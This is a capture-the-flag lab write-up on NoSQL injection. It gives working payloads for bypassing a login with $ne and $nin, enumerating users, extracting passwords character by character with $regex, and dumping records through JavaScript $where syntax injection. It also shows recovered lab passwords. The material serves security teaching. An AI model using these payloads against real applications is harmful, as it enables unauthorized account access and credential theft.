# NoSQL Injection

**Room Link:** [https://tryhackme.com/r/room/nosqlinjectiontutorial](https://tryhackme.com/r/room/nosqlinjectiontutorial)





## Operator Injection: Bypassing the Login Screen

Bypassing the Login Screen

First of all, let's open the website on [http://10.10.191.67/](http://machine\_ip/) and send an incorrect user/pass to capture the request on Burp:

![Website View](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679685897.png)\


The original captured login request looks like this:

![Burp Request](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679753604.png)\


We now proceed to intercept another login request and modify the user and pass variables to send the desired arrays:

```
user[$ne]=hackeru&pass[$ne]=hackerp&remember=on
```

![Burp Request](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679773572.png)\


This forces the database to return all user documents and as a result we are finally logged into the application:

<div align="center">

<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679795855.png" alt="Website View">

</div>

## Operator Injection: Logging in as Other Users

Logging in as Other Users

We have managed to bypass the application's login screen, but with the former technique, we can only login as the first user returned by the database. By making use of the $nin operator, we are going to modify our payload so that we can control which user we want to obtain.

First, the $nin operator allows us to create a filter by specifying criteria where the desired documents have some field, not in a list of values. So if we want to log in as any user except for the user admin, we could modify our payload to look like this:

![Burp Request](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679859318.png)\


This would translate to a filter that has the following structure:

`['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]`

Which tells the database to return any user for whom the username isn't admin and the password isn't aweasdf. As a result, we are now granted access to another user's account.

Notice that the $nin operator receives a list of values to ignore. We can continue to expand the list by adjusting our payload as follows:

![Burp Request](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679886213.png)\


```
user[$nin][]=admin&user[$nin][]=jue&pass[$ne]=aweasdf&remember=on
```

This would result in a filter like this:\


`['username'=>['$nin'=>['admin', 'jude'] ], 'password'=>['$ne'=>'aweasdf']]`



This can be repeated as many times as needed until we gain access to all of the available accounts.

Note: The `jude` user above is not an actual user, but an example of how an additional username can be added.

**To find other users**

<pre><code>#found user john
user[$nin][]=admin&#x26;user[$nin][]=pedro&#x26;pass[$ne]=aweasdf&#x26;remember=on

<strong>#found user secret
</strong>user[$nin][]=admin&#x26;user[$nin][]=pedro&#x26;user[$nin][]=john&#x26;pass[$ne]=aweasdf&#x26;remember=on

#no more users found
user[$nin][]=admin&#x26;user[$nin][]=pedro&#x26;user[$nin][]=john&#x26;user[$nin][]=secret&#x26;pass[$ne]=aweasdf&#x26;remember=on
</code></pre>



## Operator Injection: Extracting Users' Passwords

Extracting Users' Passwords

At this point, we have access to all of the accounts in the application. However, it is important to try to extract the actual passwords in use as they might be reused in other services. To accomplish this, we will be abusing the $regex operator to ask a series of questions to the server that allow us to recover the passwords via a process that resembles playing the game hangman.

First, let's take one of the users discovered before and try to guess the length of his password. We will be using the following payload to do that:

```
user=admin&pass[$regex]=^.{7}$&remember=on
```

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679978838.png" alt=""><figcaption></figcaption></figure>

Notice that we are asking the database if there is a user with a username of admin and a password that matches the regex: `^.{7}$`. This basically represents a wildcard word of length 7. Since the server responds with a login error, we know the password length for the user admin isn't 7. After some trial and error, we finally arrived at the correct answer:

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/617be9330b818bf2ed2c31f779be7c17.png" alt=""><figcaption></figcaption></figure>

We now know the password for user admin has length 5. Now to figure out the actual content, we modify our payload as follows:

```
user=admin&pass[$regex]=^c....$&remember=on
```

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719679996762.png" alt=""><figcaption></figcaption></figure>

We are now working with a regex of length 5 (a single letter c plus 4 dots), matching the discovered password length, and asking if the admin's password matches the regex `^c....$`, which means it starts with a lowercase c, followed by any 4 characters. Since the server response is an invalid login, we now know the first letter of the password can't be "c". We continue iterating over all available characters until we get a successful response from the server:\


```
user=admin&pass[$regex]=^a....$&remember=on
```

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1719680018918.png" alt=""><figcaption></figcaption></figure>

This confirms that the first letter of admin's password is 'a'. The same process can be repeated for the other letters until the full password is recovered. This can be repeated for other users as well if needed.

Following the method mentioned above I was able to get the password for John.

<pre><code>Password was 8 characters long
user=john&#x26;pass[$regex]=^.{8}$&#x26;remember=on 
<strong>
</strong>Getting the actual password, character by character
user=john&#x26;pass[$regex]=^10584312$&#x26;remember=
</code></pre>

Did it again for pedro

<pre><code>user=pedro&#x26;pass[$regex]=^.{11}$&#x26;remember=on
<strong>
</strong><strong>user=pedro&#x26;pass[$regex]=^coolpass123$&#x26;remember=
</strong></code></pre>

## Syntax Injection: Identification and Data Extraction

### Finding Syntax Injection 

Now that we have covered Operator Injection, let's take a look at a Syntax Injection example. A Python application is running to allow you to receive the email address of any username that is provided. To use the application, authenticate via SSH using `ssh syntax@10.10.70.250` along with the credentials below:



| Username | syntax            |
| -------- | ----------------- |
| Password | <p>syntax<br></p> |

Once authenticated, you can provide a username as input. Let's start by simply providing `admin`:

Terminal

```shell
ssh syntax@10.10.70.250
syntax@10.10.70.250's password: 
Please provide the username to receive their email:admin
admin@nosql.int
Connection to 10.10.70.250 closed.
```

We can start to test for Syntax Injection by simply injecting a `'` character, which will result in the error seen in the response below:

Terminal

```shell
syntax@10.10.70.250's password: 
Please provide the username to receive their email:admin'
Traceback (most recent call last):
  File "/home/syntax/script.py", line 17, in <module>
    for x in mycol.find({"$where": "this.username == '" + username + "'"}):
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1248, in next
    if len(self.__data) or self._refresh():
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1165, in _refresh
    self.__send_message(q)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/cursor.py", line 1053, in __send_message
    operation, self._unpack_response, address=self.__address
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1272, in _run_operation
    retryable=isinstance(operation, message._Query),
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1371, in _retryable_read
    return func(session, server, sock_info, read_pref)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/mongo_client.py", line 1264, in _cmd
    sock_info, operation, read_preference, self._event_listeners, unpack_res
  File "/usr/local/lib/python3.6/dist-packages/pymongo/server.py", line 134, in run_operation
    _check_command_response(first, sock_info.max_wire_version)
  File "/usr/local/lib/python3.6/dist-packages/pymongo/helpers.py", line 180, in _check_command_response
    raise OperationFailure(errmsg, code, response, max_wire_version)
pymongo.errors.OperationFailure: Failed to call method, full error: {'ok': 0.0, 'errmsg': 'Failed to call method', 'code': 1, 'codeName': 'InternalError'}
Connection to 10.10.70.250 closed.
```

The following line in the error message shows us that there is Syntax Injection:

`for x in mycol.find({"$where": "this.username == '" + username + "'"}):`

We can see that the username variable is directly concatenated to the query string and that a JavaScript function is being executed in the find command, allowing us to inject into the syntax. In this case, we have verbose error messages to give us an indication that injection is possible. However, even without verbose error messages, we could test for Syntax Injection by providing both a false and true condition and seeing that the output differs, as shown in the example below:

Terminal

```shell
ssh syntax@10.10.70.250
syntax@10.10.70.250's password: 
Please provide the username to receive their email:admin' && 0 && 'x
Connection to 10.10.70.250 closed.

ssh syntax@10.10.70.250
syntax@10.10.70.250's password: 
Please provide the username to receive their email:admin' && 1 && 'x
admin@nosql.int
Connection to 10.10.70.250 closed.
```

### Exploiting Syntax Injection

Now that we have confirmed Syntax Injection, we can leverage this injection point to dump all email addresses. To do this, we want to ensure that the testing statement of the condition always evaluates to true. As we are injecting into the JavaScript, we can use the payload of  `'||1||'`. Let's use this to disclose sensitive information:

Terminal

```shell
ssh syntax@10.10.70.250
syntax@10.10.70.250's password: 
Please provide the username to receive their email:admin'||1||'
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
[...]
Connection to 10.10.70.250 closed.
```

The Exception to the Rule

It is worth noting that for Syntax Injection to occur, the developer has to create custom JavaScript queries. The same function could be performed using the built-in filter functions where `['username' : username]` would return the same result but not be vulnerable to injection. As such, Syntax Injection is rare to find, as it means that the developers are not using the built-in functions and filters. While some complex queries might require direct JavaScript, it is always recommended to avoid this to prevent Syntax Injection. The example shown above is for MongoDB; for other NoSQL solutions, similar Syntax Injection cases may exist, but the actual syntax will be different.



